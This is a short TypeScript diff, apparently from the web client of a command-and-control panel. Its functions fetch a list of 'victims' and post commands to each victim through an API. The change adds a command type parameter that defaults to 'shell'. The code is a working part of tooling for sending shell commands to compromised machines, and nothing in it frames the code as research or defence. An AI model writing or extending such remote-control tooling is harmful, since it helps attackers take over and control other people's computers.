@@ -20,14 +20,15 @@ export async function getVictims(token?: string): Promise<Victim[]> {
 export async function sendCommand(
   victimId: string,
   command: string,
-  token?: string
+  token?: string,
+  commandType: string = "shell"
 ): Promise<void> {
   const res = await fetch(
     `${getApiUrl()}/api/victims/${encodeURIComponent(victimId)}/command`,
     {
       method: "POST",
       headers: buildHeaders(token),
-      body: JSON.stringify({ command }),
+      body: JSON.stringify({ command, command_type: commandType }),
     }
   );
   if (!res.ok) throw new Error("Failed to send command");
